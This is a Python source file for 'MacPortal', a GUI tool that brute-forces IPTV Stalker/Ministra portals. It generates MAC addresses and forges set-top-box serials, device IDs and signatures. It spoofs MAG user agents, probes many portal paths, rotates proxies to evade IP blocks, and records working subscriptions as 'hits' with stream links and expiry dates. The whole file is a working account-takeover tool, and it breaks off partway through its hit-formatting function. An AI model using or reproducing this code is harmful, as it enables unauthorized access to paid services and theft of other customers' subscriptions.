#!/usr/bin/env python3
"""
MacPortal - MAC Scanner with Modern GUI
MAC portal scanner with customtkinter GUI.
All text in English by default. Language can be switched to French or Spanish.
"""

import sys
import os
import re
import json
import time
import random
import hashlib
import threading
import queue
import socket
import datetime
import pathlib
import subprocess
import urllib.parse
import requests
import urllib3
from requests.packages.urllib3.exceptions import InsecureRequestWarning
urllib3.disable_warnings(InsecureRequestWarning)
requests.packages.urllib3.util.ssl_.DEFAULT_CIPHERS = (
    "TLS_AES_128_GCM_SHA256:TLS_CHACHA20_POLY1305_SHA256:TLS_AES_256_GCM_SHA384:"
    "TLS_ECDHE_ECDSA_WITH_AES_128_GCM_SHA256:TLS_ECDHE_RSA_WITH_AES_128_GCM_SHA256:"
    "TLS_ECDHE_ECDSA_WITH_CHACHA20_POLY1305_SHA256:TLS_ECDHE_RSA_WITH_CHACHA20_POLY1305_SHA256:"
    "TLS_ECDHE_ECDSA_WITH_AES_256_GCM_SHA384:TLS_ECDHE_RSA_WITH_AES_256_GCM_SHA384:"
    "TLS_ECDHE_ECDSA_WITH_AES_256_CBC_SHA:TLS_ECDHE_ECDSA_WITH_AES_128_CBC_SHA:"
    "TLS_ECDHE_RSA_WITH_AES_128_CBC_SHA:TLS_ECDHE_RSA_WITH_AES_256_CBC_SHA:"
    "TLS_RSA_WITH_AES_128_GCM_SHA256:TLS_RSA_WITH_AES_256_GCM_SHA384:"
    "TLS_RSA_WITH_AES_128_CBC_SHA:TLS_RSA_WITH_AES_256_CBC_SHA:"
    "TLS_RSA_WITH_3DES_EDE_CBC_SHA"
)

import customtkinter as ctk
import tkinter as tk
from tkinter import ttk, filedialog, messagebox

try:
    import tkinterweb
    HAS_TKINTERWEB = True
except ImportError:
    HAS_TKINTERWEB = False

# ═══════════════════════════════════════════════════════════
# DIRECTORY SETUP
# ═══════════════════════════════════════════════════════════
BASE_DIR = os.path.dirname(os.path.abspath(__file__))
HITS_DIR = os.path.join(BASE_DIR, 'Hits', 'MacPortal')
COMBO_DIR = os.path.join(BASE_DIR, 'combo')
PROXY_DIR = os.path.join(BASE_DIR, 'Proxies')
SOUND_DIR = os.path.join(BASE_DIR, 'sound')

for _d in [HITS_DIR, COMBO_DIR, PROXY_DIR, SOUND_DIR]:
    os.makedirs(_d, exist_ok=True)

CONFIG_FILE = os.path.join(BASE_DIR, 'macportal_config.json')

# ═══════════════════════════════════════════════════════════
# CONSTANTS
# ═══════════════════════════════════════════════════════════
MAC_PREFIXES = [
    '00:01:5F:', '00:02:F2:', '00:03:93:', '00:03:FF:', '00:04:4F:', '00:05:69:', '00:05:9A:', '00:07:AB:', '00:09:18:', '00:09:C7:', '00:09:DF:', '00:0A:27:', '00:0C:29:', '00:0E:50:', '00:0E:8F:', '00:0F:4B:', '00:11:D8:', '00:13:E8:', '00:14:22:', '00:15:AD:', '00:16:3E:', '00:18:82:', '00:18:BD:', '00:19:66:', '00:19:E0:', '00:1A:70:', '00:1A:78:', '00:1A:79:', '00:1A:E9:', '00:1B:79:', '00:1B:EA:', '00:1C:14:', '00:1C:19:', '00:1C:42:', '00:1C:79:', '00:1D:20:', '00:1D:79:', '00:1D:D5:', '00:1E:79:', '00:1E:8A:', '00:1E:B8:', '00:1F:16:', '00:1F:33:', '00:1F:3A:', '00:1F:79:', '00:20:91:', '00:21:5C:', '00:22:93:', '00:23:45:', '00:24:D4:', '00:25:90:', '00:26:75:', '00:2A:01:', '00:2A:79:', '00:30:18:', '00:40:96:', '00:50:56:', '00:60:2F:', '00:90:0B:', '00:A0:C9:', '00:A1:79:', '00:D0:D0:', '00:E0:4C:', '04:D6:AA:', '08:00:27:', '08:05:81:', '08:9E:08:', '0C:47:C9:', '10:27:BE:', '11:33:01:', '18:C8:E7:', '1A:00:6A:', '1A:00:FB:', '30:87:30:', '33:44:CF:', '55:93:EA:', '68:FF:7B:', '74:1A:79:', 'A0:BB:3E:', 'BC:2F:D0:', 'D4:CF:F9:', 'E0:37:17:'
]

PORTAL_TYPE_OPTIONS = [
    "portal.php",
    "server/load.php",
    "c/portal.php",
    "stalker_portal/server/load.php",
    "stalker_portal/server/load.php - old",
    "stalker_portal/server/load.php - (▣)",
    "portal.php - Real Blue",
    "portal.php - httpS",
    "stalker_portal/server/load.php - httpS",
    "Auto-detect",
]

PROXY_TYPES = ["ipVanish", "Socks4", "Socks5", "Http/Https"]

PATTERN = re.compile(r"(\w{2}:\w{2}:\w{2}:\w{2}:\w{2}:\w{2})", re.IGNORECASE)

# User-Agent strings per portal type
UA_DEFAULT = "Mozilla/5.0 (QtEmbedded; U; Linux; C) AppleWebKit/533.3 (KHTML, like Gecko) MAG200 stbapp ver: 4 rev: 2721 Mobile Safari/533.3"
UA_STALKER = "Mozilla/5.0 (QtEmbedded; U; Linux; C) AppleWebKit/533.3 (KHTML, like Gecko) MAG200 stbapp ver: 2 rev: 250 Safari/533.3"
UA_STALKER_V1 = "Mozilla/5.0 (QtEmbedded; U; Linux; C) AppleWebKit/533.3 (KHTML, like Gecko) MAG200 stbapp ver: 4 rev: 1812 Safari/533.3"

X_USER_AGENT = "Model: MAG254; Link: Ethernet"


# ═══════════════════════════════════════════════════════════
# UTILITY FUNCTIONS
# ═══════════════════════════════════════════════════════════
def normalize_mac(mac):
    mac = mac.strip().upper().replace("-", ":").replace(" ", "")
    if ":" not in mac and len(mac) == 12:
        mac = ":".join(mac[i:i+2] for i in range(0, 12, 2))
    return mac


def sanitize_filename(s):
    for ch in ['\\', '/', ':', '*', '?', '"', '<', '>', '|', '#']:
        s = s.replace(ch, '_')
    return s


def calc_device_ids(mac):
    mac = mac.upper()
    sn = hashlib.md5(mac.encode()).hexdigest().upper()
    sn_cut = sn[:13]
    dev1 = hashlib.sha256(mac.encode()).hexdigest().upper()
    dev2 = hashlib.sha256(sn_cut.encode()).hexdigest().upper()
    sig_input = sn_cut + mac
    signature = hashlib.sha256(sig_input.encode()).hexdigest().upper()
    return {
        'serial_full': sn,
        'serial_cut': sn_cut,
        'device_id': dev1,
        'device_id2': dev2,
        'signature': signature,
    }


def extract_json_field(text, field):
    try:
        data = text.split('"' + str(field) + '":"')[1]
        data = data.split('"')[0]
        data = data.replace('"', '')
        try:
            data = data.encode('utf-8').decode("unicode-escape").replace('\\/', '/')
        except Exception:
            pass
        return str(data)
    except Exception:
        return ""


def days_remaining(date_str):
    try:
        dt = datetime.datetime.strptime(date_str.strip(), '%B %d, %Y, %I:%M %p')
        diff = dt - datetime.datetime.now()
        return int(diff.total_seconds() / 86400)
    except Exception:
        return 0


def timestamp_to_date(ts_str):
    try:
        ts = int(ts_str)
        if ts > 1000000000:
            return datetime.datetime.fromtimestamp(ts).strftime('%d-%m-%Y %H:%M:%S')
        return ts_str
    except Exception:
        return ts_str


def play_hit_sound():
    sound = os.path.join(SOUND_DIR, 'Tiro.mp3')
    try:
        if os.path.exists(sound):
            if sys.platform == 'win32':
                import winsound
                winsound.PlaySound(sound, winsound.SND_FILENAME | winsound.SND_ASYNC)
            else:
                subprocess.Popen(
                    ['mpv', '--no-video', sound],
                    stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL
                )
    except Exception:
        pass


def list_files_in_dir(directory, ext=None):
    if not os.path.exists(directory):
        return []
    files = []
    for f in sorted(os.listdir(directory)):
        if ext and not f.endswith(ext):
            continue
        files.append(f)
    return files


def check_vpn(ip_addr):
    try:
        url = f"https://freegeoip.app/json/{ip_addr}"
        resp = requests.get(url, timeout=7, verify=False)
        text = resp.text
        if '404 page' in text or 'country_name' not in text:
            return "Not invalid"
        city = text.split('"city":"')[1].split('"')[0]
        country = text.split('"country_name":"')[1].split('"')[0]
        return f"{country} / {city}"
    except Exception:
        return "Not invalid"


def _check_proxy_ip_background(proxy_label, proxies):
    """Check the real exit IP of a proxy using ipinfo.io. Store result in state.proxy_ip_cache."""
    try:
        resp = requests.get("https://ipinfo.io/json", proxies=proxies,
                            timeout=(3, 8), verify=False)
        if resp.status_code == 200:
            data = resp.json()
            ip = data.get('ip', '?')
            country = data.get('country', '')
            org = data.get('org', '')
            info = ip
            if country:
                info += f" ({country})"
            if org:
                info += f" [{org}]"
        else:
            info = f"HTTP {resp.status_code}"
    except Exception as e:
        info = f"error: {str(e)[:30]}"
    with state.lock:
        state.proxy_ip_cache[proxy_label] = info


# ═══════════════════════════════════════════════════════════
# PORTAL CONFIGURATION
# ═══════════════════════════════════════════════════════════
class PortalConfig:
    """Holds all portal-specific settings and URL construction."""

    def __init__(self, raw_url, portal_type_name):
        self.raw_url = raw_url.strip()
        self.type_name = portal_type_name

        # Parse the raw URL into clean host
        self.host = self.raw_url
        for prefix in ['https://', 'http://']:
            self.host = self.host.replace(prefix, '')
        self.host = self.host.replace('stalker_portal', '')
        self.host = self.host.replace('/c/', '').replace('/c', '')
        self.host = self.host.replace('/', '').replace(' ', '')

        # Determine actual path, http scheme, and variant
        self.http = "http"
        self.path = "portal.php"
        self.stalker_variant = ""  # "", "1", or "2"
        self.is_real_blue = False

        if portal_type_name == "portal.php":
            self.path = "portal.php"
        elif portal_type_name == "server/load.php":
            self.path = "server/load.php"
        elif portal_type_name == "c/portal.php":
            self.path = "c/portal.php"
        elif portal_type_name == "stalker_portal/server/load.php":
            self.path = "stalker_portal/server/load.php"
        elif portal_type_name == "stalker_portal/server/load.php - old":
            self.path = "stalker_portal/server/load.php"
            self.stalker_variant = "2"
        elif portal_type_name == "stalker_portal/server/load.php - (▣)":
            self.path = "stalker_portal/server/load.php"
            self.stalker_variant = "1"
        elif portal_type_name == "portal.php - Real Blue":
            self.path = "portal.php"
            self.is_real_blue = True
        elif portal_type_name == "portal.php - httpS":
            self.path = "portal.php"
            self.http = "https"
        elif portal_type_name == "stalker_portal/server/load.php - httpS":
            self.path = "stalker_portal/server/load.php"
            self.http = "https"
        else:
            self.path = portal_type_name

        self.is_stalker = self.path == "stalker_portal/server/load.php"

    def _base_url(self):
        return f"{self.http}://{self.host}"

    def _referer(self):
        if self.is_stalker:
            return f"{self.http}://{self.host}/stalker_portal/c/"
        return f"{self.http}://{self.host}/c/"

    def _user_agent(self):
        if self.is_stalker:
            if self.stalker_variant == "1":
                return UA_STALKER_V1
            return UA_STALKER
        return UA_DEFAULT

    def make_headers(self, mac, token=None):
        mac_enc = urllib.parse.quote(mac.upper())
        headers = {
            "User-Agent": self._user_agent(),
            "Referer": self._referer(),
            "Accept": "application/json,application/javascript,text/javascript,"
                      "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
            "Cookie": f"mac={mac_enc}; stb_lang=en; timezone=Europe%2FParis;",
            "Accept-Encoding": "gzip, deflate",
            "Connection": "Keep-Alive",
            "X-User-Agent": X_USER_AGENT,
        }
        if self.is_stalker and self.stalker_variant == "1":
            headers["Cookie"] += " adid=2aedad3689e60c66185a2c7febb1f918"
        if token:
            headers["Authorization"] = f"Bearer {token}"
        return headers

    def handshake_url(self):
        return (f"{self._base_url()}/{self.path}"
                f"?type=stb&action=handshake&token=&prehash=false&JsHttpRequest=1-xml")

    def profile_url(self, mac, random_val=""):
        base = self._base_url()
        mac_enc = urllib.parse.quote(mac.upper())
        dev = calc_device_ids(mac)

        if self.is_real_blue or self.path in ("portal.php", "c/portal.php", "server/load.php"):
            if self.is_real_blue or self.path == "c/portal.php":
                return (
                    f"{base}/{self.path}?&action=get_profile&mac={mac_enc}"
                    f"&type=stb&hd=1&sn=&stb_type=MAG250&client_type=STB"
                    f"&image_version=218&device_id=&hw_version=1.7-BD-00"
                    f"&hw_version_2=1.7-BD-00&auth_second_step=1&video_out=hdmi&num_banks=2"
                    f"&metrics=%7B%22mac%22%3A%22{mac_enc}%22%2C%22sn%22%3A%22%22"
                    f"%2C%22model%22%3A%22MAG250%22%2C%22type%22%3A%22STB%22"
                    f"%2C%22uid%22%3A%22%22%2C%22random%22%3A%22null%22%7D"
                    f"&ver=ImageDescription%3A%200.2.18-r14-pub-250%3B"
                    f"%20ImageDate%3A%20Fri%20Jan%2015%2015%3A20%3A44%20EET%202016%3B"
                    f"%20PORTAL%20version%3A%205.6.1%3B%20API%20Version%3A%20JS%20API"
                    f"%20version%3A%20328%3B%20STB%20API%20version%3A%20134%3B"
                    f"%20Player%20Engine%20version%3A%200x566"
                )

        if self.is_stalker:
            ts = str(time.time())
            url = (
                f"{base}/{self.path}"
                f"?type=stb&action=get_profile&hd=1"
                f"&ver=ImageDescription:%200.2.18-r22-pub-270;%20ImageDate:%20Tue%20Dec%2019%2011:33:53%20EET%202017;"
                f"%20PORTAL%20version:%205.6.6;%20API%20Version:%20JS%20API%20version:%20328;"
                f"%20STB%20API%20version:%20134;%20Player%20Engine%20version:%200x566"
                f"&num_banks=2&sn={dev['serial_cut']}&stb_type=MAG270&client_type=STB"
                f"&image_version=0.2.18&video_out=hdmi"
                f"&device_id={dev['device_id']}&device_id2={dev['device_id']}"
                f"&signature=OaRqL9kBdR5qnMXL+h6b+i8yeRs9/xWXeKPXpI48VVE="
                f"&auth_second_step=1&hw_version=1.7-BD-00&not_valid_token=0"
                f"&metrics=%7B%22mac%22%3A%22{mac_enc}%22%2C%22sn%22%3A%22{dev['serial_cut']}%22"
                f"%2C%22model%22%3A%22MAG270%22%2C%22type%22%3A%22STB%22"
                f"%2C%22uid%22%3A%22BB340DE42B8A3032F84F5CAF137AEBA287CE8D51F44E39527B14B6FC0B81171E%22"
                f"%2C%22random%22%3A%22{random_val}%22%7D"
                f"&hw_version_2=85a284d980bbfb74dca9bc370a6ad160e968d350"
                f"&timestamp={ts}&api_signature=262"
                f"&prehash=efd15c16dc497e0839ff5accfdc6ed99c32c4e2a"
                f"&JsHttpRequest=1-xml"
            )

            if self.stalker_variant == "2":
                url = (
                    f"{base}/{self.path}"
                    f"?type=stb&action=get_profile&hd=1"
                    f"&ver=ImageDescription: 0.2.18-r14-pub-250; ImageDate: Fri Jan 15 15:20:44 EET 2016;"
                    f" PORTAL version: 5.5.0; API Version: JS API version: 328;"
                    f" STB API version: 134; Player Engine version: 0x566"
                    f"&num_banks=2&sn={dev['serial_cut']}&stb_type=MAG254"
                    f"&image_version=218&video_out=hdmi"
                    f"&device_id={dev['device_id']}&device_id2={dev['device_id']}"
                    f"&signature={dev['signature']}&auth_second_step=1"
                    f"&hw_version=1.7-BD-00&not_valid_token=0&client_type=STB"
                    f"&hw_version_2=7c431b0aec69b2f0194c0680c32fe4e3"
                    f"&timestamp={ts}&api_signature=263"
                    f"&metrics={{\\\"mac\\\":\\\"{mac_enc}\\\",\\\"sn\\\":\\\"{dev['serial_cut']}\\\","
                    f"\\\"model\\\":\\\"MAG254\\\",\\\"type\\\":\\\"STB\\\","
                    f"\\\"uid\\\":\\\"{dev['device_id']}\\\",\\\"random\\\":\\\"{random_val}\\\"}}"
                    f"&JsHttpRequest=1-xml"
                )

            elif self.stalker_variant == "1":
                url = (
                    f"{base}/{self.path}"
                    f"?type=stb&action=get_profile&hd=1"
                    f"&ver=ImageDescription%3A%200.2.18-r23-254%3B"
                    f"%20ImageDate%3A%20Wed%20Oct%2031%2015%3A22%3A54%20EEST%202018%3B"
                    f"%20PORTAL%20version%3A%205.5.0%3B%20API%20Version%3A%20JS%20API%20version%3A%20343%3B"
                    f"%20STB%20API%20version%3A%20146%3B%20Player%20Engine%20version%3A%200x58c"
                    f"&num_banks=2&sn={dev['serial_cut']}&client_type=STB"
                    f"&image_version=218&video_out=hdmi"
                    f"&device_id={dev['device_id']}&device_id2={dev['device_id']}"
                    f"&signature={dev['signature']}&auth_second_step=1"
                    f"&hw_version=2.6-IB-00&not_valid_token=0"
                    f"&metrics=%7B%22mac%22%3A%22{mac_enc}%22%2C%22sn%22%3A%22{dev['serial_cut']}%22"
                    f"%2C%22type%22%3A%22STB%22%2C%22model%22%3A%22MAG254%22"
                    f"%2C%22uid%22%3A%22{dev['device_id']}%22%2C%22random%22%3A%22{random_val}%22%7D"
                    f"&hw_version_2=5ab8c9dceec64b9540bb41bc527e88658aa8c620"
                    f"&timestamp={ts}&api_signature=262"
                    f"&prehash=4cda0db2375f15f906d2b4df85fc58e05b839d79"
                    f"&JsHttpRequest=1-xml"
                )

            return url

        # Fallback for server/load.php (non-stalker)
        return (
            f"{base}/{self.path}?type=stb&action=get_profile"
            f"&JsHttpRequest=1-xml"
        )

    def account_info_url(self):
        return (f"{self._base_url()}/{self.path}"
                f"?type=account_info&action=get_main_info&JsHttpRequest=1-xml")

    def profile_url_realblue(self, mac, random_val=""):
        if self.is_stalker:
            return None
        base = self._base_url()
        mac_enc = urllib.parse.quote(mac.upper())
        return (
            f"{base}/{self.path}?&action=get_profile&mac={mac_enc}"
            f"&type=stb&hd=1&sn=&stb_type=MAG250&client_type=STB"
            f"&image_version=218&device_id=&hw_version=1.7-BD-00"
            f"&hw_version_2=1.7-BD-00&auth_second_step=1&video_out=hdmi&num_banks=2"
            f"&metrics=%7B%22mac%22%3A%22{mac_enc}%22%2C%22sn%22%3A%22%22"
            f"%2C%22model%22%3A%22MAG250%22%2C%22type%22%3A%22STB%22"
            f"%2C%22uid%22%3A%22%22%2C%22random%22%3A%22null%22%7D"
            f"&ver=ImageDescription%3A%200.2.18-r14-pub-250%3B"
            f"%20ImageDate%3A%20Fri%20Jan%2015%2015%3A20%3A44%20EET%202016%3B"
            f"%20PORTAL%20version%3A%205.6.1%3B%20API%20Version%3A%20JS%20API"
            f"%20version%3A%20328%3B%20STB%20API%20version%3A%20134%3B"
            f"%20Player%20Engine%20version%3A%200x566"
        )

    def channels_url(self):
        return (f"{self._base_url()}/{self.path}"
                f"?type=itv&action=get_all_channels&force_ch_link_check=&JsHttpRequest=1-xml")

    def create_link_url(self, cid):
        if self.is_stalker:
            return (
                f"{self._base_url()}/{self.path}"
                f"?type=itv&action=create_link&cmd=ffrt%20http://localhost/ch/{cid}"
                f"&series=&forced_storage=0&disable_ad=0&download=0"
                f"&force_ch_link_check=0&JsHttpRequest=1-xml"
            )
        return (
            f"{self._base_url()}/{self.path}"
            f"?type=itv&action=create_link&cmd=ffmpeg%20http://localhost/ch/{cid}_"
            f"&series=&forced_storage=0&disable_ad=0&download=0"
            f"&force_ch_link_check=0&JsHttpRequest=1-xml"
        )

    def vod_list_url(self):
        return (f"{self._base_url()}/{self.path}"
                f"?action=get_ordered_list&type=vod&p=1&JsHttpRequest=1-xml")

    def vod_create_link_url(self, cmd):
        return (f"{self._base_url()}/{self.path}"
                f"?type=vod&action=create_link&cmd={cmd}"
                f"&series=&forced_storage=&disable_ad=0&download=0"
                f"&force_ch_link_check=0&JsHttpRequest=1-xml")

    def genres_url(self):
        return (f"{self._base_url()}/{self.path}"
                f"?type=itv&action=get_genres&JsHttpRequest=1-xml")

    def vod_categories_url(self):
        return (f"{self._base_url()}/{self.path}"
                f"?action=get_categories&type=vod&JsHttpRequest=1-xml")

    def series_categories_url(self):
        return (f"{self._base_url()}/{self.path}"
                f"?action=get_categories&type=series&JsHttpRequest=1-xml")


PROBE_PORTAL_PATHS = [
    '/portal.php',
    '/server/load.php',
    '/stalker_portal/server/load.php',
    '/c/portal.php',
    '/portalstb/portal.php',
    '/stalker_u.php',
    '/c/server/load.php',
    '/magaccess/portal.php',
    '/portalcc.php',
    '/bs.mag.portal.php',
    '/magportal/portal.php',
    '/maglove/portal.php',
    '/tek/server/load.php',
    '/emu/server/load.php',
    '/emu2/server/load.php',
    '/portalott.php',
    '/ghandi_portal/server/load.php',
    '/magLoad.php',
    '/ministra/portal.php',
    '/xx/portal.php',
    '/portalmega.php',
    '/portalmega/portal.php',
    '/rmxportal/portal.php',
    '/portalmega/portalmega.php',
    '/powerfull/portal.php',
    '/korisnici/server/load.php',
    '/nettvmag/portal.php',
    '/cmdforex/portal.php',
    '/k/portal.php',
    '/p/portal.php',
    '/cp/server/load.php',
    '/extraportal.php',
    '/Link_Ok/portal.php',
    '/delko/portal.php',
    '/delko/server/load.php',
    '/bStream/portal.php',
    '/bStream/server/load.php',
    '/blowportal/portal.php',
    '/client/portal.php',
    '/server/move.php',
]

PROBE_MAG_UAS = [
    'Mozilla/5.0 (QtEmbedded; U; Linux; C) AppleWebKit/533.3 (KHTML, like Gecko) MAG200 stbapp ver: 4 rev: 1812 Safari/533.3',
    'Mozilla/5.0 (QtEmbedded; U; Linux; C) AppleWebKit/533.3 (KHTML, like Gecko) MAG200 stbapp ver: 2 rev: 250 Safari/533.3',
    'Mozilla/5.0 (QtEmbedded; U; Linux; C) AppleWebKit/533.3 (KHTML, like Gecko) MAG200 stbapp ver: 4 rev: 2721 Mobile Safari/533.3',
    'Mozilla/5.0 (compatible; CloudFlare-AlwaysOnline/1.0; +https://www.cloudflare.com/always-online) AppleWebKit/534.34',
    'Mozilla/5.0 (X11; Linux i686; U;rv: 1.7.13) Gecko/20070322 Kazehakase/0.4.4.1',
    'Mozilla/5.0 (X11; U; Linux 2.4.2-2 i586; en-US; m18) Gecko/20010131 Netscape6/6.01',
    'Mozilla/5.0 (X11; U; Linux i686; de-AT; rv:1.8.0.2) Gecko/20060309 SeaMonkey/1.0',
]

STATUS_PRIORITY = {200: 0, 302: 1, 401: 2, 403: 3, 512: 4, 520: 5}
STATUS_LOW = {444: 6, 404: 7}


def _is_cloudflare_block(resp):
    """Check if response is a Cloudflare block/challenge page."""
    if resp.status_code in (403, 503):
        text = resp.text[:2000].lower()
        if 'cloudflare' in text and ('blocked' in text or 'attention required' in text or 'just a moment' in text):
            return True
        if 'cf-browser-verification' in text or 'cf_chl_opt' in text:
            return True
    return False


def _probe_base_url(raw_url):
    clean = raw_url.strip()
    for prefix in ['https://', 'http://']:
        if clean.startswith(prefix):
            clean = clean[len(prefix):]
    clean = clean.split('/')[0].rstrip('/')
    return f'http://{clean}'


def auto_detect_portal_all(raw_url, log_fn=None):
    """Probe all known paths and return ALL candidates.
    Returns list of (priority, path, status_code) sorted best-first.
    Empty list if nothing found. log_fn(msg, level) optional for progress."""
    base_url = _probe_base_url(raw_url)
    candidates = []
    errors = []

    for path in PROBE_PORTAL_PATHS:
        try:
            resp = requests.get(
                base_url + path,
                headers={'User-Agent': random.choice(PROBE_MAG_UAS)},
                timeout=5,
                verify=False,
            )
            if _is_cloudflare_block(resp):
                if log_fn:
                    log_fn(f"  Cloudflare block detected - your IP is blocked by this server", "warning")
                return [('cloudflare_blocked', '', 0)]
            status = resp.status_code
            if status in STATUS_PRIORITY:
                candidates.append((STATUS_PRIORITY[status], path, status))
                if log_fn:
                    log_fn(f"  {path:<40s} [HTTP {status}]", "success")
            elif status in STATUS_LOW:
                errors.append((STATUS_LOW[status], path, status))
                if log_fn:
                    log_fn(f"  {path:<40s} [HTTP {status}]", "debug")
            else:
                if log_fn:
                    log_fn(f"  {path:<40s} [HTTP {status}]", "debug")
        except (requests.ConnectionError, requests.Timeout):
            if log_fn:
                log_fn(f"  No connection for {path}", "warning")
            continue
        except Exception:
            continue

    candidates.sort(key=lambda c: (c[0], len(c[1])))
    if not candidates and errors:
        for pri, path, status in errors:
            if status == 444:
                candidates.append((pri, path, status))
        candidates.sort(key=lambda c: (c[0], len(c[1])))
    return candidates


def auto_detect_portal(raw_url):
    """Backward-compatible: returns best path string or None."""
    candidates = auto_detect_portal_all(raw_url)
    if candidates:
        return candidates[0][1].lstrip('/')
    return None


# ═══════════════════════════════════════════════════════════
# MAC GENERATION
# ═══════════════════════════════════════════════════════════
def _clean_serial_prefix(raw):
    """Strip non-hex chars, return up to 6 hex chars uppercase."""
    raw = raw.strip().replace(":", "").replace("-", "")
    hex_chars = [c for c in raw.upper() if c in "0123456789ABCDEF"]
    return "".join(hex_chars[:6])


def generate_random_macs(prefix, count, serial_prefix=""):
    serial_hex = _clean_serial_prefix(serial_prefix)
    fix_len = len(serial_hex)
    macs = set()
    while len(macs) < count:
        b = [random.randint(0, 255) for _ in range(3)]
        suffix = "%02X%02X%02X" % (b[0], b[1], b[2])
        if fix_len > 0:
            suffix = serial_hex + suffix[fix_len:]
        mac = prefix + f"{suffix[0:2]}:{suffix[2:4]}:{suffix[4:6]}"
        mac = mac.upper().replace(':100', ':10')
        macs.add(mac)
    return list(macs)


def generate_cascading_macs(prefix, count, serial_prefix=""):
    serial_hex = _clean_serial_prefix(serial_prefix)
    fix_len = len(serial_hex)
    remaining = 6 - fix_len
    macs = []
    counter = 0
    max_val = 16 ** max(remaining, 1)

    for _ in range(count):
        if remaining <= 0:
            suffix = serial_hex[:6]
        else:
            val = counter % max_val
            count_hex = format(val, f'0{remaining}X')
            suffix = serial_hex + count_hex
        suffix = suffix[:6]
        mac = prefix + f"{suffix[0:2]}:{suffix[2:4]}:{suffix[4:6]}"
        mac = mac.upper().replace(':100', ':10')
        macs.append(mac)
        counter += 1
        if counter >= max_val:
            break
    return macs


def load_macs_from_file(filepath):
    macs = []
    try:
        with open(filepath, 'r', encoding='utf-8') as f:
            for line in f:
                line = line.strip()
                match = PATTERN.search(line)
                if match:
                    macs.append(normalize_mac(match.group()))
    except Exception:
        pass
    return macs


# ═══════════════════════════════════════════════════════════
# PROXY MANAGEMENT
# ═══════════════════════════════════════════════════════════
def load_proxies(filepath, proxy_type):
    proxies = []
    try:
        with open(filepath, 'r', encoding='utf-8') as f:
            for line in f:
                line = line.strip()
                if not line or line.startswith('#'):
                    continue
                parts = line.split('#')[0].strip().split(':')
                if len(parts) >= 4 and proxy_type == "ipVanish":
                    proxies.append({
                        'host': parts[0], 'port': int(parts[1]),
                        'user': parts[2], 'pass': parts[3],
                        'type': proxy_type,
                    })
                elif len(parts) >= 2:
                    proxies.append({
                        'host': parts[0], 'port': int(parts[1]),
                        'user': None, 'pass': None,
                        'type': proxy_type,
                    })
    except Exception:
        pass
    return proxies


class ProxyPool:
    def __init__(self, proxy_list):
        self.proxies = proxy_list
        self.index = 0
        self.lock = threading.Lock()

    def get_next(self):
        if not self.proxies:
            return None, "DIRECT"
        with self.lock:
            p = self.proxies[self.index % len(self.proxies)]
            self.index += 1

        host, port = p['host'], p['port']
        ptype = p['type']

        if ptype == "ipVanish" and p.get('user'):
            url = f"socks5://{p['user']}:{p['pass']}@{host}:{port}"
        elif ptype == "Socks4":
            url = f"socks4://{host}:{port}"
        elif ptype == "Socks5":
            if p.get('user'):
                url = f"socks5://{p['user']}:{p['pass']}@{host}:{port}"
            else:
                url = f"socks5://{host}:{port}"
        elif ptype == "Http/Https":
            if p.get('user'):
                url = f"http://{p['user']}:{p['pass']}@{host}:{port}"
            else:
                url = f"http://{host}:{port}"
        else:
            url = f"socks5://{host}:{port}"

        proxy_dict = {'http': url, 'https': url}
        label = f"{host}:{port}"
        return proxy_dict, label

    @property
    def count(self):
        return len(self.proxies)


# ═══════════════════════════════════════════════════════════
# SCANNER STATE
# ═══════════════════════════════════════════════════════════
class ScannerState:
    def __init__(self):
        self.lock = threading.Lock()
        self.running = False
        self.paused = False
        self.pause_event = threading.Event()
        self.pause_event.set()
        self.scan_count = 0
        self.found_count = 0
        self.error_count = 0
        self.total_macs = 0
        self.total_portals = 0
        self.queue = queue.Queue()
        self.results = []
        self._gui = None
        self.proxy_ip_cache = {}
        self.show_real_proxy_ip = False
        self.raw_easter_egg_enabled = False

    def reset(self):
        gui = self._gui
        cached_ips = getattr(self, 'proxy_ip_cache', {})
        show_ip = getattr(self, 'show_real_proxy_ip', False)
        raw_egg = getattr(self, 'raw_easter_egg_enabled', False)
        self.__init__()
        self._gui = gui
        self.proxy_ip_cache = cached_ips
        self.show_real_proxy_ip = show_ip
        self.raw_easter_egg_enabled = raw_egg

    def add_result(self, result):
        is_hit = result["status"] in ("valid", "expired")
        with self.lock:
            self.results.append(result)
            self.scan_count += 1
            if is_hit:
                self.found_count += 1
                self.queue.put(result)
            if result["status"] in ("error", "unreachable"):
                self.error_count += 1
        if is_hit and self._gui:
            self._gui.update_results_tree(result)

    def get_progress(self):
        with self.lock:
            return self.scan_count, self.total_macs * self.total_portals


state = ScannerState()


# ═══════════════════════════════════════════════════════════
# HIT FORMATTING
# ═══════════════════════════════════════════════════════════
def format_hit(result, nick):
    mac = result.get('mac', '')
    dev = calc_device_ids(mac)
    portal_host = result.get('portal_host', '')
    portal_path = result.get('portal_path', '')

    if portal_path == "stalker_portal/server/load.php":
        base_url = f"http://{portal_host}/stalker_portal/c/"
    else:
        base_url = f"http://{portal_host}/c/"

    lines = [
        f"",
        f"╔═🚧─🔹️MacPortal🔹️─🚧═╗",
        f"╠☞ ᴘᴏʀᴛᴀʟ:  {base_url}",
        f"╠☞ sᴇʀᴠᴇʀ:  {base_url}",
        f"╠☞ ᴍᴀᴄ:  {mac}",
        f"╠☞ ᴇxᴘɪʀᴇ:  {result.get('expiry', '')}",
        f"╠☞ SERVER TIMEZONE : {result.get('timezone', 'N/A')}",
        f"╠☞ Total Channels : {result.get('channel_count', 0)}",
        f"╠☞ ᴠᴘɴ:  {result.get('vpn', '')}",
        f"╠☞ ᴍᴀᴄ:  {result.get('mac_status', '')}",
        f"╠☞ ᴍ3ᴜ:  {result.get('m3u_status', '')}",
        f"╠☞ ʜɪᴛs ʙʏ☞{nick}☜",
        f"╚════════☰ ",
    ]
    lines.append(f"")
    lines.append(f"╔══ 🔗 🄼③🅄 ⚙️ 🄻🄸🄽🄺 🔗")
    if result.get('m3u_link'):
        lines.append(f"╠☞ ᴍ3ᴜ: {result['m3u_link']}")
    lines.append(f"╠☞ ғᴜʟʟsᴇʀɪᴀʟ: {dev['serial_full']}")
    lines.append(f"╠☞ sᴇʀɪᴀʟ ɴᴜᴍʙᴇʀ: {dev['serial_cut']}")
    lines.append(f"╠☞ ɪᴅ1: {dev['device_id']}")
    lines.append(f"╠☞ ɪᴅ2: {dev['device_id2']}")
    lines.append(f"╠☞ sɪɢɴᴀᴛᴜʀᴇ: {dev['signature']}")
    lines.append(f"╚════════☰ ")
